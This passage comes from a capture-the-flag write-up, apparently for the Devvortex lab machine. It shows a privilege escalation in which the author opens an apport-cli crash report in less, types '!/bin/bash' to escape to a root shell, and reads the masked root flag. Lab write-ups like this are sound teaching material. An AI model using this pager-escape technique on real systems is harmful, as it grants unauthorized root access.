  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C):

```

At this menu, I can select “V” to get back into `less`. It takes a minute generating a report depending on the report size. Once it’s done, it opens in `less`:

![image-20240423170454738](https://0xdf.gitlab.io/img/image-20240423170454738.png)

To escape from `less`, I’ll type `!/bin/bash`, and I’m dropped to a root shell:

```
root@devvortex:/home/logan# id
uid=0(root) gid=0(root) groups=0(root)

```

And I’ll grab the root flag:

```
root@devvortex:~# cat root.txt
79bd5241************************

```





